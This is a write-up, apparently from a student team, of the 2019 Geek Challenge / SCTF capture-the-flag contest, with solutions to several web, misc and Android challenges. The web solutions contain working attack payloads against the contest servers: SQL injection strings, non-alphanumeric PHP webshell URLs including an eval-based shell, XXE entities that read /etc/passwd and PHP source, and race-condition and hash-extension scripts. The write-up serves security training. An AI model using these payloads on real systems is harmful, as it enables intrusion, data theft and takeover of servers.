

## SCTF-2019(三叶草CTF) && 第十届极客大挑战

> 比赛类型：校招赛
> 比赛时间：2019-10-12 09:00~2019-11-11 00:00
> 比赛平台：http://geek.sycsec.com:44444/
> 官方QQ群：915847196
> 官方wp：[点击下载](../writeup/2019-Geek_WriteUp.pdf)

<br/>

## 附件链接

链接：https://pan.baidu.com/s/1tWdYnhty3YiSdEzLVnbvFA 提取码：hdxw

链接：https://share.weiyun.com/hDo98Z2G 密码：rjmc28

链接：https://t1m.lanzous.com/b0aet0u2b 密码:hdxw

<br/>

## WEB

### 1.打比赛前先撸一只猫！
> 出题人：cl4y
> 猫猫陪我打ctf！
> 地址:http://118.25.14.40:8110/
> hint:撸猫：https://www.cnblogs.com/ranyonsue/p/5984001.html

查看网页源码发现
```html
<!--
    $cat=$_GET['cat'];
    echo $cat;
    if($cat=='dog'){
        echo 'Syc{cat_cat_cat_cat}';
    }
-->
```
访问“?cat=dog”得到flag
```
Syc{I_actu4l1y_Lik3_d0gs}
```
<br/>

### 2.你看见过我的菜刀么

> 出题人：cl4y
> 地址:http://118.25.14.40:8105/
> hint:菜刀：https://qq52o.me/2277.html

打开连接后提示了菜刀的“密码”是“Syc”，连上菜刀后在“/flag/flag.txt”找到flag
```
Syc{Upl0ad_f1l3_i5_daNger0us}
```

<br/>

### 3.BurpSuiiiiiit!!!

> 出题人：Lamber
> 拿起你的burp，开始战斗吧
> 附件: 链接：https://share.weiyun.com/5WD42Vt 密码：zp5sy9
> 备用链接:http://geek.sycsec.com:44444/static/file/Burp.zip

附件下载：Burp.zip

下载得到一个jar文件，用jd-gui反编译后发现主要代码都在“BurpExtender.class”中，把变量a、b、c相关代码复制出来，执行输出后从a得到的d仍然是base64编码，再次解码得到flag
```
Syc{BurpExtender_Are_guns_F0r_Hack3rs}
```

<br/>

### 4.性感潇文清，在线算卦

> 出题人：Ayrain
> 动作快点才能算到好卦。
> 地址:http://148.70.59.198:42534/

查看源码发现提示“条件竞争”，创建两个python脚本
```python
import requests

# 脚本一
i=0
while 1:
    r = requests.get("http://148.70.59.198:42534/?u=1&p=2")
    print(i)
    i+=1

# 脚本二
while 1:
    r = requests.get("http://148.70.59.198:42534/?u=1&p=1")
    page = str(r.text).split("<")[0].strip(" ").replace("Ding!你的算卦结果就在这儿啦！快来看！","")
    r = requests.get("http://148.70.59.198:42534/"+page)
    if r.text != 'you are too slow':
        print(r.text)
        break
```
先运行“脚本一”占用服务器资源，再运行“脚本二”就可以得到flag
```
Syc{You-4re-S0-f4st}
```
<br/>

### 5.Easysql

> 出题人：cl4y
> 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！
> 地址:http://118.25.14.40:8100/

用户名输入“admin't”，发现可以注入。使用用户名“admin”，万能密码“admin'||'1”，或者用户名“secpulse'='”，密码“secpulse'='”，登录得到flag
```
Syc{sqL_inj3cti0n_1s_re4lly_fUn}
```

<br/>

### 6.RCE me

> 出题人：evoA
> I don't think U can system RCE, prove to me
> 地址:http://114.116.44.23:40001/

访问地址返回源码
```php
<?php
error_reporting(0);
if(iset($_GET['code'])){
        $code=$_GET['code'];
            if(strlen($code)>40){
                    die("This is too Long.");
                    }
            if(preg_match("/[A-Za-z0-9]+/",$code)){
                    die("NO.");
                    }
            @eval($code);
}
else{
        highlight_file(__FILE__);
}
highlight_file(__FILE);

// ?>
```
限制长度和字符的webshell，网上搜索“无字母webshell”，构造playload如下
```bash
# 预期解（php7.0）
# 测试，返回phpinfo()信息
http://114.116.44.23:40001/?code=(~%8F%97%8F%96%91%99%90)();

# 代码放在在User-Agent中执行
# ("assert")(("next")(("getallheaders")()));
http://114.116.44.23:40001/?code=(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));


# 非预期解
# 执行assert("phpinfo()")
http://114.116.44.23:40001/?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=phpinfo()

# 直接链接shell
http://114.116.44.23:40001/?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=eval($_POST['t1m']);


注意：从phpinfo的disable_functions可以看出pcntl_exec,system,exec,shell_exec,popen,proc_open,passthru等函数都被禁用了
```
上面两种都可以执行任意php代码了但是不能执行命令，可以使用php代码利用readdir等函数读到系统根目录下有flag和readflag文件，所以还是需要执行命令运行readflag文件，LD_PRELOAD模式绕过。利用fwrite等函数上传so文件和php脚本到/tmp目录下(网站目录没有写权限)，命令执行/readflag文件得到flag

```
Syc{I_think_Th1s_1s_Cha113nge_G4me_for_U_H4v3_f4n!}
```

出题人wp：https://evoa.me/index.php/archives/62/

工具：[LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)

<br/>

### 7.李三的代码审计笔记第一页

> 出题人：cl0und
> Talk is easy ,show me the code.
> 地址:http://ctf1.redteam.today:8081


看懂代码实现一个简单的服务器
```php
# PHP版
<?php
@session_start();
$key='ttt';
$counter = intval(file_get_contents("counter.dat"));
//创建一个dat数据文件
if(!$_SESSION[$key]) {
	$_SESSION[$key] = true;
	$counter++;
	//刷新一次+1
	$fp = fopen("counter.dat","w");
	//以写入的方式，打开文件，并赋值给变量fp
	fwrite($fp, $counter);
	//将变量fp的值+1
	fclose($fp);
}
$password = "If I knew where I would die, I would never go there.";
$arr = explode(' ', $password);
echo $arr[($counter-1)%count($arr)];
?>
```



```python
# Python版
import flask
import datetime

server=flask.Flask(__name__)
data = "If I knew where I would die, I would never go there."
data = data.split(" ")
data.reverse()

@server.route('/',methods=['post','get'])
def index():
    return data.pop()

server.run(port=8888)
```
访问 http://ctf1.redteam.today:8081/?url=http%3a%2f%2fserver_ip%2findex.php 得到flag
```
Syc{ede405bb37a47c4c60abd4c0a8f36595}
```

<br/>

### 8.服务端检测系统

> 出题人：淚笑
> emm，自己看
> 地址:http://148.70.59.198:41256/
> hint:ssrf && crlf

<br/>


### 9.Lovelysql
> 出题人：cl4y
> 上次是我粗心大意，看来不能直接放在网页上了！
> 地址:http://118.25.14.40:8101/

毫无过滤的联合查询注入，“#”可以注释sql
```
# 数据库名
username=admin&password=admin'union select 1,2,group_concat(schema_name) from information_schema.schemata#

# 表名
username=admin&password=admin'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#

# 列名
username=admin&password=admin'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#

# 字段
username=admin&password=admin'union select 1,2,group_concat(password) from l0ve1ysq1#
```
最后得到flag
```
Syc{Ohhh_y0u_foUnd_m3}
```

<br/>

### 10.性感黄阿姨，在线聊天

> 出题人：淚笑
> 听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！
> 地址:http://148.70.59.198:41257/
> hint:weak php && xxe

聊天界面输入“flag”提示“我很想告诉你的，可惜你只是我的guest”，查看源码发现post请求，把“name”值改为“admin”发送请求，返回“admin也不行! //if($name==md5($flag)){flag in ...}”，把“name”参数从字符串改为数字进行爆破（weak php：php弱类型比较）。
```python
import requests,json

headers = {'content-type': 'application/json'}
for i in range(357,358):
    res = requests.post("http://148.70.59.198:41257/message.php",data=json.dumps({"root":{"name":i,"request":"flag"}}), headers=headers)
    print(eval(res.text)["response"])
```
当name=357时返回信息“Congratulations! flag in ./_f14g_Is_Here_.php ,try ro read it!”


```xml
<!-- 读/etc/passwd测试 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE GVI [<!ENTITY flag SYSTEM "file:///etc/passwd" >]>
<root class="object">
	<name type="number">&flag;</name>
	<request type="string">flag</request>
</root>

<!-- 直接读文件会读不到 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE GVI [<!ENTITY flag SYSTEM "file:///var/www/html/_f14g_Is_Here_.php" >]>
<root class="object">
	<name type="number">&flag;</name>
	<request type="string">flag</request>
</root>

<!-- 利用php://伪协议读php内容 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE GVI [<!ENTITY flag SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/_f14g_Is_Here_.php" >]>
<root class="object">
	<name type="number">&flag;</name>
	<request type="string">flag</request>
</root>
```
返回信息
```json
{"response":"我很想告诉你的，可惜你只是我的PD9waHANCiAgICAkZmxhZz0iU3lje3czYUtfUGhwX2FOZF9YeEV9Ijs="}
```
base64解码后得到flag
```
Syc{w3aK_Php_aNd_XxE}
```

<br/>

### 11.李三的代码审计笔记第二页

> 出题人：cl0und
> 听说李三用这个裁剪他的头像，http://ctf1.redteam.today:8233/www.zip
> 地址:http://ctf1.redteam.today:8233/

附件下载：www.zip

<br/>

### 12.Babysql
> 出题人：cl4y
> 成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！
> 地址:http://118.25.14.40:8102/

对危险字符进行过滤，替换为空，这里双写绕过就好，payload参考lovelysql（第9题），使用下面方法替换password
```python
def doubleKeyword(str):
    str = str.replace("union","ununionion")
    str = str.replace("select","seselectlect")
    str = str.replace("from","frfromom")
    str = str.replace("or","oorr")
    str = str.replace("where","whwhereere")
    str = str.replace("and","anandd")
    return str
```
得到flag
```
Syc{Cl4y_w4ngt5_A_g1rlfri3nd}
```

<br/>

### 13.神秘的三叶草

> 出题人：cl4y
> 柳暗花明
> 地址:http://118.25.14.40:8108/

<br/>

### 14.Eval evil code

> 出题人：Ayrain
> Lamber是个老实人，他会执行你给他的代码。
> 地址:http://148.70.59.198:34386/

<br/>

### 15.Jiang‘s Secret

> 出题人：cl4y
> 我在那放了一个秘密！
> 地址:http://118.25.14.40:8106/

<br/>

### 16.Hardsql

> 出题人：cl4y
> 信安之路，任重道远…
> 地址:http://118.25.14.40:8103/
> hint:sql报错注入

因为对union过滤，所以不能用联合查询了，or|and|substr|if|hex|mid|char|等等都进行了过滤，这里只能用报错注入，updatexml，extractvalue都可以
```
# 数据库名
username=admin&password=admin'^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)#

# 表名
username=admin&password=admin'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like'geek'),0x7e),1)#

# 列名
username=admin&password=admin'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like'H4rDsq1'),0x7e),1)#

# 字段
username=admin&password=admin'^updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1)#
```
得到flag
```
Syc{You_c4n_erRor_1njecti0n}
```

<br/>

### 17.你有特洛伊么

> 出题人：cl4y
> dGhpcyBpcyBub3QgZWFzeQ==
> 地址:http://118.25.14.40:8107/

<br/>

### 18.Leixiao's blog

> 出题人：淚笑
> 你会盗号吗？？
> 地址:http://148.70.59.198:41258
> hint:储存型XSS && 认真测试各个功能点(怀疑机器人挂了的Q我)

<br/>

### 19.反序列化1.0

> 出题人：Ayrain
> socre10000拿到flag
> 地址:http://148.70.59.198:42374/

php反序列化，没有需要绕过的东西
```php
<?php
class Student
{
    public $score = 0;
    public function __destruct()
    {
        echo "__destruct working";
        if($this->score==10000) {
            $flag = "******************";
            echo $flag;
        }
    }
}
echo serialize(new Student());
?>
```
运行后把分数0改为10000，得到“O:7:"Student":1:{s:5:"score";i:10000;}”，添加到exp参数得到flag
```
Syc{F4n-Xu-L4i-Hu4-Ha-Ha-Ha}
```

<br/>

### 20.又来一只猫

> 出题人：cl4y
> 我家猫名字叫php
> 地址:http://118.25.14.40:8109/

源码下载：www-cat2.zip

网页提示“备份网站”，扫描发现网站根目录下存在“www.zip”，下载得到源码，是php变量覆盖和反序列化的绕过

O:4:"Name":2:{S:8:"username";s:5:"admin";S:8:"password";s:8:"password";}

<br/>

### 21.你有初恋吗

> 出题人：7h1n9
> 你变心了吗
> 地址:http://cxc.design/53a5734d6c99f89a

网页源码里有php源码，使用hash长度扩展攻击
```python
# python2
import hashpumpy
import urllib,urllib2

res = hashpumpy.hashpump('6a1ce5f4dc83320710006a786ac82c17', 'syclover', 'tail', 15)

print res[0]
print urllib.quote(res[1])


url='http://cxc.design/53a5734d6c99f89a/'
headers = { 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36' }
data='lover='+urllib.quote(res[1])
opener = urllib2.build_opener()
opener.addheaders.append(('Cookie','Heart='+res[0]))
req = urllib2.Request(url=url, data=data, headers=headers)
response = opener.open(req)
response = response.read()
print response
```
返回flag
```
Syc{D0_Y0u_l0v3_M3???}
```

<br/>

### 22.Finalsql

> 出题人：cl4y
> sql你太美:
> 地址:http://118.25.14.40:8104/

<br/>

### 23.你读懂潇文清的网站了吗

> 出题人：Ayrain
> xxe
> 地址:http://148.70.59.198:29173/

[19:19:07] 200 -    0B  - /config.php
[19:19:07] 200 -    0B  - /config.php
[19:19:16] 301 -  322B  - /html  ->  http://148.70.59.198:29173/html/
[19:19:18] 200 -    2KB - /index.php
[19:19:18] 200 -    2KB - /index.php
[19:19:18] 200 -    2KB - /index.php/login/
[19:19:36] 403 -  304B  - /server-status
[19:19:36] 403 -  305B  - /server-status/
[19:19:45] 200 -    0B  - /upload
[19:19:45] 200 -  528B  - /upload.php
[19:19:45] 301 -  325B  - /uploads  ->  http://148.70.59.198:29173/uploads/
[19:19:45] 403 -  299B  - /uploads/
[19:21:31] 200 -   14MB - /error.log

<br/>

## MISC

### 1.签到
> 出题人：淚笑
> 你知道三叶草小组的公众号吗？
> hint:听说公众号上有flag哦，你能让它给你吗?

公众号发送“flag”得到flag
```
Syc{w3lc0me_t0_th3_10th_geek!}
```

<br/>

### 2.啊啊啊啊啊啊啊！！！我好兴奋！！！

> 出题人：Lamber
> 啊啊啊啊，让我嗨！！！我要打一辈子极客！！！
> 附件: https://share.weiyun.com/5mV9CFC 密码：f87jf4
> 备用链接: http://geek.sycsec.com:44444/static/file/开启新世界的大门.rar
> hint:工具：010editor 学习链接 https://ctf-wiki.github.io/ctf-wiki/misc/prefix-zh/

附件下载：开启新世界的大门.rar

<br/>

### 3.翻过这座山

> 出题人：Lamber
> 翻过这座山，他们就会听到你的故事
> 地址:https://t.me/Lamber_Syclover

翻墙打开链接，得到一个[github地址](https://github.com/LambGod/)，打开后有一个[翻墙相关的库](https://github.com/LambGod/Shadowsocks-Tutorial)，flag（假的）在“注意事项.txt”中，查看提交历史得到真flag
```
# 假flag
Syc{Thank_you_for_your_patronage}

# 真flag
Syc{outside_the_wall_is_wonderful}
```

<br/>

### 4.散打黑客的压缩包

> 出题人：Lamber
> 我拼着生命危险从散打黑客的电脑里偷来的压缩包，大家快跟我一起破解开。看看藏着什么东西。 
> 附件文件: 链接：https://share.weiyun.com/5ngV2Fy 密码：iqwrex
> 备用： http://geek.sycsec.com:44444/static/file/%E6%88%91%E5%A4%AA%E9%9A%BE%E4%BA%86.rar
> hint:4number

附件下载：我太难了.rar

<br/>

### 5.是谁杀了谁

> 出题人：Lamber
> 注意自己的HP，别被气死了。
> 附件文件: 链接：https://share.weiyun.com/5dS8Zih 密码：c2za3j
> 备用: http://geek.sycsec.com:44444/static/file/谁叫我.zip

附件下载：谁叫我.zip

<br/>

### 6.RPG真是太有趣了吧

> 出题人：0xSw0rder
> 做题也太累了,不如来打会游戏吧.
> 附件文件:链接：https://pan.baidu.com/s/1SZhQA_vrLs09XXC--FOdxw 提取码：llx0

附件下载：Project1.exe

用RPG Maker XP打开，在最后一个boss的event里
```
Syc{I_l0ve_Rpg_VErY_Much!!!!!!}
```

参考链接：https://yaoandy107.github.io/AIS3-Final-CTF-hellOwOrld/

<br/>

### 7.嘿，你喜欢吃鲱鱼罐头吗？

> 出题人：Lamber
> 实验室禁止吃鲱鱼罐头！
> 附件文件: 链接：https://share.weiyun.com/56N8IXl 密码：ck3snh
> hint:English & Google (very easy, do not think too much) & 高层 潇闻钦为了让大家牢记实验室不能吃鲱鱼罐头，专门去打了个备注

附件下载：希望你喜欢.zip

010Editor打开图片，后面有一段由“isdo”四个字母组成的字符串，使用“[deadfish](https://www.dcode.fr/deadfish-language)”解密后得到字符的ascii码，转换成字符串后得到flag
```
Syc{SURSTR0mming_is_deLici0us}
```

### 8.我也想成为r1ngs
> 出题人：Lamber
> r1ngs超厉害，好想抱大腿
> 附件链接：https://pan.baidu.com/s/19yiHeK8pjrTBZEJQqJreuA 提取码：lks6

附件下载：我也想成为r1ngs.zip

hex转10进制转ascii（或者空格替换为%，然后[在线url解码](http://tool.chinaz.com/tools/urlencode.aspx)），放在文本编辑器中，缩小即可看到flag
```
Syc{Tribut3_TO_r1ngs}
```

<br/>

### 9.马里奥也太有趣了吧

> 出题人：Sparkle
> 做题也太累了，不如再来打会游戏吧
> 附件文件：链接：https://share.weiyun.com/5ZEIdUz 密码：tmfj6s

附件下载：Super_Player.nes

<br/>

### 10.I wanna be a geek

> 出题人：0xSw0rder
> 想成为geek是要付出代价的,比如一个shift键.shift键跳跃,z键射
> 附件文件:链接：https://pan.baidu.com/s/1q-jyVYvupskI7q7r0P3hQw 提取码：9e7v

附件下载：Game.zip

通过射击存档，修改存档文件中存档位置即可遍历所有场景

```
Syc{You_Are_a_G00d_Gamer}
```

<br/>

### 11.游戏玩累了，不如来来听听歌吧

> 出题人：Sparkle
> 吉良吉影发动了败者食尘！时间开始倒流了!
> 附件文件：链接：https://share.weiyun.com/5fvRx9W 密码：itw8jy

附件下载：Great Days.zip

<br/>

### 12.早点睡

> 出题人：Lamber
> 别熬夜做题了，身体要紧
> 附件文件: 链接：https://share.weiyun.com/5wopnH6 密码：5u7iub
> hint:出题人是傻逼，有问题私聊出题人

附件下载：sleep1.zip
网盘附件：sleep2.zip、sleep3.zip、sleep4.zip

附件是psd文件，用ps打开，发现隐藏图层，改变图层显隐，调整“不透明度”和“填充”到最大得到网盘链接，打开后下载得到sleep2.zip。
```
链接：https://share.weiyun.com/5UI0nMT 密码：v3m4t4
```

解压后文件内容是base64，转图片（base64解码得到hex或者“data:image/png;base64,+base64”）后得到二维码，扫码得到网盘链接，打开后下载得到sleep3.zip。
```
链接：https://share.weiyun.com/5pUPiDQ 密码：7u5b5z
```

同上步骤，转图片、扫码、下载得到sleep4.zip。
```
链接：https://share.weiyun.com/5bhmn0P 密码：vs3agu
```

再次解压后得到base64，文本后面发现不断重复的base64
```
U3lje1N0YXlpbmdfVXBsYXRlX0lTX2JhZGZvcl9UaGVCb2R5fQ==
```
解码得到flag
```
Syc{Staying_Uplate_IS_badfor_TheBody}
```

<br/>

### 13.The Final

> 出题人：Lamber, 0xSw0rder, Sparkle, Unity_404，路人A
> 极客就要结束了, 出题人Lamber的虚拟机却不小心被偷了。这可如何是好。
> 附件文件:链接：https://pan.baidu.com/s/1mAa0dYs4lILg_tE6h0Qy-A 提取码：h8rt
> hint:该题目不提供任何额外hint, 所需hint均在解题过程中。尽情享受最后的“杂”项吧！

附件下载：Final Game.zip

<br/>

## PWN

### 1.Find tools
> 出题人：燕乘风
> Find right tools，so easy！ 
> nc pwnto.fun 9999

<br/>

### 2.Baby rop

> 出题人：燕乘风：:据说一步一步学 rop, 是不错的入门方式。 
>
> nc pwnto.fun 10000 
>
> 附件文件：链接：https://share.weiyun.com/5Fn4FEM 密码：8s7tt3 备用: http://geek.sycsec.com:44444/static/file/hello
> hint:https://segmentfault.com/a/1190000005888964

附件下载：hello.zip

<br/>

### 3.Baby Shellcode

> 出题人：燕乘风
>
> 打CSGO，它不香吗？P90 rush b, let's go. 
>
> nc pwnto.fun 12300 
>
> 附件文件：链接：https://share.weiyun.com/5N0ik8O 密码：e2i8eu
> hint:只有open.read.write是可用函数 && orw 我觉有必要了解一下linux的系统调用 && flag和bin在同一目录下

附件下载：RushB.zip

<br/>

### 4.Baby canary

> 出题人：燕乘风
>
> 相比于flag弄清原理才是更重要的 
>
> nc pwnto.fun 10007 
>
> 附件文件：链接：https://share.weiyun.com/5Co8w4u 密码：vne8qf

附件下载：canary2.zip

<br/>

### 5.Easy canary

> 出题人：燕乘风
>
> Easy canary, have fun! 
>
> nc pwnto.fun 10001 
>
> 附件文件：链接：https://share.weiyun.com/5vxS4fB 密码：gyfin7

附件下载：canary.zip

<br/>

### 6.Not bad

> 出题人：燕乘风
>
> nc pwnto.fun 12301 
>
> 附件文件：链接：https://share.weiyun.com/5Q8dkDc 密码：xta9t9

附件下载：bad.zip

<br/>

## RE

### 1.jiang's fan
> 出题人：安缘
>
> 密码都记错？你个假粉丝！！ 
>
> 附件文件: https://share.weiyun.com/5lmZaMw，提取码：dl8e5l 备用链接:http://geek.sycsec.com:44444/static/file/hello.exe

附件下载：hello.exe

<br/>

### 2.secret

> 出题人：安缘
>
> 猜猜看啊... 
>
> 链接：https://pan.baidu.com/s/1NS5-3lCvl3aH5tUJqFRDAg 提取码：1nyl

附件下载：23333.zip

<br/>

### 3.Easy VB

> 出题人：0xSw0rder
>
> 我的IDA怎么不能F5了,这可怎么办啊? 
>
> 附件文件:链接：YPSuperKey Unlockedhttps://pan.baidu.com/s/1RS7o1nZOJAmYujlZoZ9FcQ 提取码：kllx

附件下载：Easy VB.exe

<br/>

### 4.冰菓

> 出题人：Unity_404
>
> 千反田不小心把重要的东西落在了古典文学社，你能帮她找到吗？ 
>
> 附件文件: https://res.cloudinary.com/macc1989/raw/upload/v1570441228/samples/冰菓.zip

附件下载：冰菓.zip

<br/>

### 5.PYC是啥子嘛?

> 出题人：我也配学逆向？
>
> 听说py不需要逆向，那pyc呢，pyc是什么呢？ 
>
> 附件文件:[re_py.pyc]链接：https://share.weiyun.com/5ewotoL

附件下载：re_py.zip

<br/>

### 6.Dll Reverse

> 出题人：Unity_404
>
> 你了解动态链接库吗 ？ 
>
> 附件文件: https://res.cloudinary.com/macc1989/raw/upload/v1571235477/samples/DLL_Reverse.zip

附件下载：DLL_Reverse.zip

<br/>

### 7.Win32 Progra

> 出题人：MinL
>
> 输入你的账号密码 
>
> 附件文件: https://share.weiyun.com/5TDYYC8
> hint:what is Peb(Process Environment Block), and how to get it.

附件下载：WinRe_0x1.zip

<br/>

### 8.阅兵你认真看了么?

> 出题人：我也配学逆向？
>
> 听说你是个合格的小粉红。 
>
> 附件文件:[阅兵你认真看了嘛？] https://share.weiyun.com/5HH6Ftd

附件下载：阅兵你认真看了嘛？.zip

<br/>

### 9.python1

> 出题人：0x指纹
>
> 会python吗？ 
>
> 题目链接：https://pan.baidu.com/s/1cnPjGHfy2rfnGu7rhbIrsw&shfl=sharepset 提取码：ui4q
> hint:真不可逆吗？乘二是偶，异或是奇

附件下载：python1.zip

<br/>

### 10.python2

> 出题人：0x指纹
>
> 会Z3吗？ 
>
> 题目链接：YPSuperKey Unlockedhttps://pan.baidu.com/s/1yFnSNlEit8aePl_IRDY80w 提取码：emfo
> hint:先确定flag长度，再爆破中使用Z3

附件下载：python2.zip

<br/>

### 11.python3

> 出题人：0x指纹
>
> 会Unicorn吗？ 
>
> 题目链接：https://pan.baidu.com/s/1ufIKYEb-mirw5i9ZuYnkLg 提取码：t5om

附件下载：python3.zip

<br/>

## Android

### 1.Sign_in
> 出题人：0xE4s0n
>
> 来了就签个到呗 
>
> 附件文件: https://share.weiyun.com/5ycHTPb 密码：kkfyun 备用链接: http://geek.sycsec.com:44444/static/file/Sign_in.apk
> hint:https://www.52pojie.cn/thread-408645-1-1.html

附件下载：Sign_in.apk

反编译后发现flag在资源文件中，变量名是“sign_in”，找到变量base64解密得到flag
```
Syc{Si9n_1n_I3_E4sy!}
```
<br/>

### 2.蒋学姐的秘密

> 出题人：0xE4s0n
>
> 听说这里面藏着蒋学姐的秘密,只要你能够登录进去就能看见 
>
> 附件文件: https://share.weiyun.com/5NTosXm 密码：kamkvd

附件下载：Login.apk

<br/>

### 3.正在尝试重新连接

> 出题人：0xE4s0n
>
> 完了,成信施工大队又挖断网线了,正在尝试重新连接。。。 
>
> 附件文件: https://share.weiyun.com/5fh6RsW 密码：m7unb6
> hint:https://www.baidu.com/baidu?wd=ida+%E5%8A%A8%E8%B0%83so&tn=monline_4_dg&ie=utf-8

附件下载：Hello World.apk

<br/>

### 4.little case

> 出题人：0xE4s0n
>
> 蒋学姐：“这题太简单了，直接秒！” 
>
> 附件文件: https://share.weiyun.com/5pyGbuo 密码：vvhycg

附件下载：little_case.apk

<br/>

## Coding

### 1.Dragon Quest
> 出题人：hakuQAQ
>
> 按照题目要求编写C语言程序
> 地址:http://49.235.130.247:8018/

<br/>

### 2.挡路羊驼
> 出题人：hakuQAQ
>
> 请根据题目描述编写C语言程序
> 地址:http://49.235.130.247:8023/

